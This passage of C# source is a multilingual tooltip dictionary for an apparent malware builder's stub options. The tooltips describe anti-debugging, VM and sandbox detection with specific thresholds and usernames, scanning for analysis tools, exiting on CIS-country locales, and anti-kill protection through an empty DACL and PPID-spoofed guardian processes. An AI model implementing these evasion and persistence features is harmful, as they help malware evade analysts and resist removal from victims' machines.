            // ── Builder checkbox tooltips ────────────────────────────────────────
            ["BLD_TT_ANTIDEBUG"]   = new() { ["en"]="Detects debuggers attached to the stub process (IsDebuggerPresent, NtQueryInformationProcess, hardware breakpoints). Exits immediately if a debugger is found.", ["fr"]="Détecte les débogueurs attachés au processus stub. Quitte immédiatement si un débogueur est trouvé.", ["es"]="Detecta depuradores adjuntos al proceso stub (IsDebuggerPresent, NtQueryInformationProcess, breakpoints de hardware). Sale inmediatamente si se detecta un depurador.", ["de"]="Erkennt Debugger, die dem Stub-Prozess angehängt sind (IsDebuggerPresent, NtQueryInformationProcess, Hardware-Breakpoints). Beendet sofort, wenn ein Debugger gefunden wird.", ["pt"]="Detecta depuradores anexados ao processo stub (IsDebuggerPresent, NtQueryInformationProcess, breakpoints de hardware). Sai imediatamente se um depurador for encontrado.", ["it"]="Rileva debugger collegati al processo stub (IsDebuggerPresent, NtQueryInformationProcess, breakpoint hardware). Termina immediatamente se viene trovato un debugger.", ["ru"]="Обнаруживает отладчики, подключённые к процессу-стабу (IsDebuggerPresent, NtQueryInformationProcess, аппаратные точки останова). Немедленно завершает работу при обнаружении отладчика.", ["zh"]="检测附加到存根进程的调试器（IsDebuggerPresent、NtQueryInformationProcess、硬件断点）。检测到调试器时立即退出。", ["ar"]="يكتشف المصحّحات المرتبطة بعملية الـ stub (IsDebuggerPresent, NtQueryInformationProcess, نقاط توقف الأجهزة). يخرج فوراً عند اكتشاف مصحّح.", ["tr"]="Stub sürecine bağlı hata ayıklayıcıları tespit eder (IsDebuggerPresent, NtQueryInformationProcess, donanım kesme noktaları). Hata ayıklayıcı bulunursa hemen çıkar." },
            ["BLD_TT_ANTIVM"]      = new() { ["en"]="Detects virtual machine environments (VMware, VirtualBox, Hyper-V) via registry, file presence, and hardware fingerprint. Exits if a VM is detected.", ["fr"]="Détecte les environnements de machines virtuelles (VMware, VirtualBox, Hyper-V). Quitte si une VM est détectée.", ["es"]="Detecta entornos de máquinas virtuales (VMware, VirtualBox, Hyper-V) mediante registro, presencia de archivos y huella de hardware. Sale si se detecta una VM.", ["de"]="Erkennt virtuelle Maschinenumgebungen (VMware, VirtualBox, Hyper-V) über Registrierung, Dateipräsenz und Hardware-Fingerprint. Beendet, wenn eine VM erkannt wird.", ["pt"]="Detecta ambientes de máquinas virtuais (VMware, VirtualBox, Hyper-V) via registo, presença de ficheiros e impressão digital de hardware. Sai se uma VM for detectada.", ["it"]="Rileva ambienti di macchine virtuali (VMware, VirtualBox, Hyper-V) tramite registro, presenza di file e impronta hardware. Termina se viene rilevata una VM.", ["ru"]="Определяет среды виртуальных машин (VMware, VirtualBox, Hyper-V) через реестр, наличие файлов и аппаратный отпечаток. Завершает работу при обнаружении ВМ.", ["zh"]="通过注册表、文件存在和硬件指纹检测虚拟机环境（VMware、VirtualBox、Hyper-V）。检测到虚拟机时退出。", ["ar"]="يكتشف بيئات الأجهزة الافتراضية (VMware, VirtualBox, Hyper-V) عبر السجل ووجود الملفات وبصمة الجهاز. يخرج إذا تم اكتشاف جهاز افتراضي.", ["tr"]="Kayıt defteri, dosya varlığı ve donanım parmak izi aracılığıyla sanal makine ortamlarını tespit eder (VMware, VirtualBox, Hyper-V). VM algılanırsa çıkar." },
            ["BLD_TT_ANTIDETECT"]  = new() { ["en"]="Scans running processes for known analysis tools (x64dbg, IDA, Wireshark, CAPE agents), suspicious usernames (sandbox, bruno, john) and sandbox machine names.", ["fr"]="Recherche les outils d'analyse connus (x64dbg, IDA, Wireshark), noms d'utilisateurs suspects et noms de machines sandbox.", ["es"]="Escanea los procesos en ejecución en busca de herramientas de análisis conocidas (x64dbg, IDA, Wireshark, agentes CAPE), nombres de usuario sospechosos (sandbox, bruno, john) y nombres de máquinas sandbox.", ["de"]="Durchsucht laufende Prozesse nach bekannten Analysetools (x64dbg, IDA, Wireshark, CAPE-Agenten), verdächtigen Benutzernamen (sandbox, bruno, john) und Sandbox-Maschinen-Namen.", ["pt"]="Examina os processos em execução em busca de ferramentas de análise conhecidas (x64dbg, IDA, Wireshark, agentes CAPE), nomes de utilizador suspeitos (sandbox, bruno, john) e nomes de máquinas sandbox.", ["it"]="Analizza i processi in esecuzione alla ricerca di strumenti di analisi noti (x64dbg, IDA, Wireshark, agenti CAPE), nomi utente sospetti (sandbox, bruno, john) e nomi di macchine sandbox.", ["ru"]="Сканирует запущенные процессы в поисках известных инструментов анализа (x64dbg, IDA, Wireshark, агенты CAPE), подозрительных имён пользователей (sandbox, bruno, john) и имён машин-«песочниц».", ["zh"]="扫描运行进程以查找已知分析工具（x64dbg、IDA、Wireshark、CAPE代理）、可疑用户名（sandbox、bruno、john）和沙箱机器名称。", ["ar"]="يفحص العمليات الجارية بحثاً عن أدوات التحليل المعروفة (x64dbg, IDA, Wireshark, وكلاء CAPE) وأسماء المستخدمين المشبوهة (sandbox, bruno, john) وأسماء أجهزة الـ sandbox.", ["tr"]="Çalışan süreçleri bilinen analiz araçları (x64dbg, IDA, Wireshark, CAPE ajanları), şüpheli kullanıcı adları (sandbox, bruno, john) ve sandbox makine adları için tarar." },
            ["BLD_TT_BLOCKCIS"]    = new() { ["en"]="Immediately exits if the Windows locale belongs to a CIS country: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["fr"]="Quitte immédiatement si la locale Windows appartient à un pays CEI: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["es"]="Sale inmediatamente si la configuración regional de Windows pertenece a un país CEI: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["de"]="Beendet sofort, wenn das Windows-Gebietsschema zu einem GUS-Land gehört: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["pt"]="Sai imediatamente se a configuração regional do Windows pertencer a um país CEI: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["it"]="Termina immediatamente se la locale di Windows appartiene a un paese CSI: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["ru"]="Немедленно завершает работу, если языковой стандарт Windows принадлежит стране СНГ: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["zh"]="如果Windows区域设置属于独联体国家，立即退出：RU、BY、KZ、AM、AZ、KG、TJ、TM、UZ、MD。", ["ar"]="يخرج فوراً إذا كانت لغة Windows تنتمي إلى دولة من رابطة الدول المستقلة: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD.", ["tr"]="Windows yerel ayarı bir BDT ülkesine aitse hemen çıkar: RU, BY, KZ, AM, AZ, KG, TJ, TM, UZ, MD." },
            ["BLD_TT_ANTISANDBOX"] = new() { ["en"]="Scores the environment across multiple indicators: uptime under 3 minutes, sleep-acceleration detection (checks if Sleep() returns faster than expected), fewer than 3 temp files, under 1 GB RAM, fewer than 8 installed programs. Exits if the score exceeds the sandbox threshold.", ["fr"]="Évalue l'environnement selon plusieurs indicateurs : uptime < 3 min, accélération du sleep, moins de 3 fichiers temp, < 1 Go RAM, moins de 8 programmes installés. Quitte si le score dépasse le seuil sandbox.", ["es"]="Evalúa el entorno según múltiples indicadores: tiempo de actividad inferior a 3 minutos, detección de aceleración de sleep, menos de 3 archivos temporales, menos de 1 GB de RAM, menos de 8 programas instalados. Sale si la puntuación supera el umbral sandbox.", ["de"]="Bewertet die Umgebung anhand mehrerer Indikatoren: Laufzeit unter 3 Minuten, Sleep-Beschleunigungs-Erkennung, weniger als 3 Temp-Dateien, unter 1 GB RAM, weniger als 8 installierte Programme. Beendet, wenn der Score den Sandbox-Schwellenwert überschreitet.", ["pt"]="Avalia o ambiente com base em múltiplos indicadores: tempo de atividade inferior a 3 minutos, detecção de aceleração de sleep, menos de 3 ficheiros temporários, menos de 1 GB de RAM, menos de 8 programas instalados. Sai se a pontuação exceder o limite sandbox.", ["it"]="Valuta l'ambiente in base a più indicatori: uptime inferiore a 3 minuti, rilevamento accelerazione sleep, meno di 3 file temporanei, meno di 1 GB di RAM, meno di 8 programmi installati. Termina se il punteggio supera la soglia sandbox.", ["ru"]="Оценивает среду по нескольким показателям: время работы менее 3 минут, обнаружение ускорения сна, менее 3 временных файлов, менее 1 ГБ ОЗУ, менее 8 установленных программ. Завершает работу, если оценка превышает порог «песочницы».", ["zh"]="通过多个指标评估环境：正常运行时间不足3分钟，睡眠加速检测，少于3个临时文件，低于1GB内存，少于8个已安装程序。如果分数超过沙箱阈值则退出。", ["ar"]="يُقيّم البيئة عبر مؤشرات متعددة: وقت التشغيل أقل من 3 دقائق، كشف تسريع السكون، أقل من 3 ملفات مؤقتة، أقل من 1 جيجابايت RAM، أقل من 8 برامج مثبتة. يخرج إذا تجاوزت النتيجة عتبة الـ sandbox.", ["tr"]="Ortamı birden fazla göstergeye göre puanlar: 3 dakikadan kısa uptime, uyku hızlandırma tespiti, 3'ten az geçici dosya, 1 GB'dan az RAM, 8'den az yüklü program. Puan sandbox eşiğini aşarsa çıkar." },
            ["BLD_TT_ANTIKILL"]    = new() { ["en"]="Protects the stub process from being killed: sets an empty DACL so Task Manager, Process Explorer, and taskkill.exe fail with Access Denied. Also spawns 4 guardian processes with PPID spoofing that restart the stub if killed.", ["fr"]="Protège le processus stub contre l'arrêt forcé via une DACL vide (accès refusé dans le Gestionnaire des tâches). Lance 4 processus gardiens avec usurpation PPID qui relancent le stub si tué.", ["es"]="Protege el proceso stub de ser eliminado: establece un DACL vacío para que el Administrador de tareas, Process Explorer y taskkill.exe fallen con Acceso denegado. También lanza 4 procesos guardianes con suplantación de PPID que reinician el stub si es eliminado.", ["de"]="Schützt den Stub-Prozess vor dem Beenden: setzt eine leere DACL, sodass Task-Manager, Process Explorer und taskkill.exe mit Zugriff verweigert fehlschlagen. Startet auch 4 Wächter-Prozesse mit PPID-Spoofing, die den Stub neu starten, wenn er beendet wird.", ["pt"]="Protege o processo stub de ser eliminado: define uma DACL vazia para que o Gestor de Tarefas, Process Explorer e taskkill.exe falhem com Acesso Negado. Também inicia 4 processos guardiões com falsificação de PPID que reiniciam o stub se for eliminado.", ["it"]="Protegge il processo stub dall'essere terminato: imposta una DACL vuota in modo che Gestione attività, Process Explorer e taskkill.exe falliscano con Accesso negato. Avvia anche 4 processi guardiani con PPID spoofing che riavviano lo stub se terminato.", ["ru"]="Защищает процесс-стаб от принудительного завершения: устанавливает пустой DACL, из-за чего Диспетчер задач, Process Explorer и taskkill.exe получают отказ в доступе. Также запускает 4 сторожевых процесса с подделкой PPID, которые перезапускают стаб при его завершении.", ["zh"]="保护存根进程免遭终止：设置空DACL使任务管理器、Process Explorer和taskkill.exe以「拒绝访问」失败。还生成4个带PPID欺骗的守卫进程，在存根被终止时重新启动它。", ["ar"]="يحمي عملية الـ stub من الإنهاء القسري: يضع DACL فارغاً حتى يفشل إدارة المهام وProcess Explorer وtaskkill.exe بخطأ الوصول مرفوض. يُطلق أيضاً 4 عمليات حارسة مع انتحال PPID تُعيد تشغيل الـ stub إذا تم إنهاؤه.", ["tr"]="Stub sürecini öldürülmekten korur: Görev Yöneticisi, Process Explorer ve taskkill.exe'nin Erişim Reddedildi ile başarısız olması için boş bir DACL ayarlar. Ayrıca öldürülürse stub'ı yeniden başlatan PPID sahteciliğiyle 4 koruyucu süreç başlatır." },

